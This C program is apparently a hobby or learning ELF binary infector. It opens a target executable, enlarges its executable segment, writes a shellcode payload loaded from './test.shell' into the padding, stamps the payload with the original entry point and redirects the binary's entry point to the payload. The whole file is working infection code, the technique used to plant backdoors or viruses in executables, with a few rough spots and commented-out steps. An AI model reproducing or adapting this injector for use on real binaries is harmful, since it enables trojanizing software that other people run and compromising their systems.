#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <elf.h>

#include "payload.h"

int get_next_ph(FILE *binary, Elf64_Phdr *ph)
{
    /* Gets the next segment from the provided binary and returns it via segment parameter

    */
    int retval = 0;
    int count = 0;
    Elf64_Phdr program_header;

    count = fread(&program_header, sizeof(Elf64_Phdr), 1, binary);
    if (count < 0)
    {
        perror("Unable to read binary");
        return 1;
    }

    *ph = program_header;
    return retval;
}

int find_executable_ph(FILE *binary, Elf64_Phdr *ph, int ph_start, int ph_num)
{
    /* Locates the executable segment within the binary and returns it via segment parameter

    */
    int retval = 0;
    int curr_ph = 0;
    Elf64_Addr curr_ph_start = 0; //addr where current ph begins

    fseek(binary, ph_start, SEEK_CUR);
    while (curr_ph < ph_num)
    {
        curr_ph_start = ftell(binary);
        retval = get_next_ph(binary, ph);
        if (retval != 0)
        {
            puts("Failed to get next segment");
            return -1;
        }

        if (ph->p_flags & PF_X) // found exe segment ph?
        {
            return curr_ph_start;
        }

        curr_ph++;
    }

    return -1;
}

int get_ph_info(FILE *binary, int *ph_start, int *ph_num, Elf64_Addr *entrypoint)
{
    /* Get start of program headers, and size of program headers

    */
    int count = 0;
    Elf64_Ehdr header;

    count = fread(&header, sizeof(Elf64_Ehdr), 1, binary);
    if (count <= 0)
    {
        perror("Unable to read binary");
        return 1;
    }
    printf("Program Headers start at: %d\n", header.e_phoff);
    printf("Total program header entries: %d\n", header.e_phnum);

    *ph_start = header.e_phoff;
    *ph_num = header.e_phnum;
    *entrypoint = header.e_entry;

    rewind(binary);
}

int swap_entry_point(FILE *binary, int entry_address)
{
    /* Replaces binary entry point with provided address

    */
    int count = 0;
    Elf64_Ehdr header;

    rewind(binary);

    count = fread(&header, sizeof(Elf64_Ehdr), 1, binary);
    if (count <= 0)
    {
        perror("Unable to read binary");
        return 1;
    }
    printf("current entry point: 0x%x\n", header.e_entry);
    printf("changing to : 0x%x\n", entry_address);

    rewind(binary);

    header.e_entry = entry_address;
    count = fwrite(&header, sizeof(Elf64_Ehdr), 1, binary);
    if (count <= 0)
    {
        perror("Unable to write to binary");
        return 1;
    }

    rewind(binary);

    return 0;
}

int calculate_padding(FILE *binary, Elf64_Phdr exe_phdr, int *padding)
{
    int retval = 0;
    Elf64_Phdr next_phdr;

    get_next_ph(binary, &next_phdr);

    printf("Next segment at: 0x%x\n", next_phdr.p_paddr);
    printf("Executable segment size: %d\n", exe_phdr.p_filesz);

    *padding = next_phdr.p_paddr - (exe_phdr.p_paddr + exe_phdr.p_filesz);

    rewind(binary);
    return retval;
}

int expand_execuable_segment(FILE *binary, Elf64_Addr exe_ph_start, Elf64_Phdr exe_ph, int payload_size)
{
    /* Expands executable segment to fit payload

       Returns new segment end address
    */
    Elf64_Addr old_end = 0;

    rewind(binary);
    printf("exe ph start: %d\n", exe_ph_start);
    fseek(binary, exe_ph_start, SEEK_CUR); //go to exe ph start

    old_end = exe_ph.p_offset + exe_ph.p_filesz;

    exe_ph.p_filesz += payload_size;
    exe_ph.p_memsz += payload_size;

    fwrite(&exe_ph, sizeof(exe_ph), 1, binary);
    rewind(binary);

    return old_end;
}

int inject_payload(FILE *binary, Elf64_Addr injection_site, uint8_t *payload, int payload_size)
{
    int retval = 0;

    rewind(binary);

    fseek(binary, injection_site, SEEK_CUR);
    retval = fwrite(payload, payload_size, 1, binary);
    if (retval <= 0)
    {
        puts("unable to write payload");
        return 1;
    }

    return 0;
}

int expand_fini(FILE *binary, int payload_size)
{
    int section_header_start = 17280;
    Elf64_Addr curr_header_start = 0; //where current sh begins
    Elf64_Shdr curr_header;
    Elf64_Shdr next_header;

    memset(&curr_header, 0, sizeof(curr_header));
    rewind(binary);

    fseek(binary, section_header_start, SEEK_CUR);

    for (;;)
    {
        curr_header_start = ftell(binary);
        fread(&next_header, sizeof(Elf64_Shdr), 1, binary);
        printf("section address: 0x%x\n", curr_header.sh_addr);
        if (next_header.sh_flags & SHF_EXECINSTR) //find first exe sh...
        {
            break;
        }
    }

    /*for (;;)
    {
        next_header_start = ftell(binary);
        fread(&next_header, sizeof(Elf64_Shdr), 1, binary);
        printf("section address: 0x%x\n", curr_header.sh_addr);
        if ((next_header.sh_flags & SHF_EXECINSTR) && !exe_found) //find first exe section
        {
            exe_found = 1;
        }
        if (!(next_header.sh_flags & SHF_EXECINSTR) && exe_found) //last exe section (fini)
        {
            break;
        }
        memcpy(&curr_header, &next_header, sizeof(Elf64_Shdr));
        curr_header = next_header;
    }*/

    printf("fini address: 0x%x\n", curr_header.sh_addr);
    curr_header.sh_size += payload_size;

    rewind(binary);
    fseek(binary, curr_header_start, SEEK_CUR);

    fwrite(&curr_header, sizeof(Elf64_Shdr), 1, binary);

    rewind(binary);

    return 0;
}

int main(int argc, char *argv[])
{
    int retval = 0;
    int ph_start = 0; //start address for program headers
    int ph_num = 0;   //program header (ph) count
    int padding = 0;
    int payload_size = 0;
    FILE *binary = NULL;
    Elf64_Phdr exe_ph;
    Elf64_Addr exe_ph_start; //where executable program header begins
    Elf64_Addr entrypoint;
    Elf64_Addr prev_exe_segment_end; //where exe ph ends before modification
    uint8_t *payload = NULL;

    memset(&exe_ph, 0, sizeof(exe_ph));

    if (argc != 2)
    {
        puts("Invalid usage");
        return 1;
    }

    binary = fopen(argv[1], "r+");
    if (NULL == binary)
    {
        perror("Unable to open binary");
        retval = 1;
        return retval;
    }

    retval = get_ph_info(binary, &ph_start, &ph_num, &entrypoint);
    if (retval > 0)
    {
        puts("Failed to find segment size");
        retval = 1;
        goto cleanup;
    }

    exe_ph_start = find_executable_ph(binary, &exe_ph, ph_start, ph_num);
    if (exe_ph_start <= 0)
    {
        puts("Failed to find executable segment");
        goto cleanup;
    }

    printf("Execuatable ph at: 0x%x\n", exe_ph_start);
    printf("Executable segment at: 0x%x\n", exe_ph.p_paddr);

    retval = calculate_padding(binary, exe_ph, &padding);
    if (retval > 0)
    {
        puts("Failed to calculate available padding");
        goto cleanup;
    }

    printf("Padding available: %d bytes\n", padding);

    payload_size = get_payload(&payload, "./test.shell");
    if (retval > 0)
    {
        puts("Failed to load payload");
        goto cleanup;
    }

    retval = stamp_entrypoint(payload, entrypoint);
    if (retval > 0)
    {
        puts("faild to stamp payload with original entrypoint");
        goto cleanup;
    }

    printf("Payload size: %d bytes\n", payload_size);
    if (payload_size < padding)
    {
        puts("payload will fit!");
    }
    else
    {
        puts("not enough room for payload :(");
    }

    printf("Original exe segment size: %d\n", exe_ph.p_filesz);

    prev_exe_segment_end = expand_execuable_segment(binary, exe_ph_start, exe_ph, payload_size); //necessary?
    if (prev_exe_segment_end <= 0)
    {
        puts("Failed to expand executable segment");
        goto cleanup;
    }

    /*retval = expand_fini(binary, payload_size); not needed?
    if (retval > 0)
    {
        puts("Failed to expand ifni section");
        goto cleanup;
    }*/

    printf("Prev segment end: 0x%x\n", prev_exe_segment_end);

    printf("Writing payload to address: 0x%x\n", prev_exe_segment_end);

    retval = inject_payload(binary, prev_exe_segment_end, payload, payload_size);
    if (retval > 0)
    {
        puts("Failed to inject payload");
        goto cleanup;
    }

    retval = swap_entry_point(binary, exe_ph.p_paddr + exe_ph.p_filesz);
    if (retval > 0)
    {
        puts("Failed to swap entry point");
        goto cleanup;
    }

    puts("Successfully overwrote entry point");

cleanup:
    fclose(binary);
    if (payload)
    {
        free(payload);
    }
    return retval;
}
